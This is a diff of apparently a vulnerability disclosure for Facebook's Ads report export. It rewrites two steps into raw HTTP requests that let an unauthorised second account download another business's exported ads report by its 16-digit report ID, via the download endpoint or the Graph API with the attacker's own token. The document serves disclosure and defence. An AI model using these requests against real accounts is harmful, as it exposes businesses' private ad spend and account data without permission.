@@ -25,12 +25,22 @@ Using the Graph API or report download endpoints, an attacker could export Ads M
 3. Open Inspector (DevTools) and observe the network requests/responses; when clicking Export report, the response contains `report_run_id` (a 16‑digit numeric ID).  
 4. As a second account (not admin/employee of the victim business), load the direct download endpoint:
    ```http
-   GET https://www.facebook.com/ads/report_builder/export/download_report/?report_run_id={ID_report}&scope=business_account
+   POST /ads/report_builder/export/download_report/?report_run_id={ID_report}&scope=business_account HTTP/1.1
+   Host: www.facebook.com
+   User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0
+   Accept: */*
+   Content-Type: application/x-www-form-urlencoded
+   Connection: close
    ```
    The file will be returned in the attacker's session containing the exported report with account names, reach, amount spent, etc.
 5. Alternatively, use Graph API to fetch the report by ID:
    ```http
-   GET https://graph.facebook.com/{ID_report_length_16_victim}&access_token={TOKEN_Attacker}
+   GET /{ID_report_length_16_victim}&access_token={TOKEN_Attacker} HTTP/1.1
+   Host: graph.facebook.com
+   User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0
+   Accept: */*
+   Content-Type: application/x-www-form-urlencoded
+   Connection: close
    ```
    - The attacker can obtain a business access token (or other tokens) by inspecting their own Business Manager requests or other means.  
    - With a valid token, the attacker can retrieve the report content programmatically.
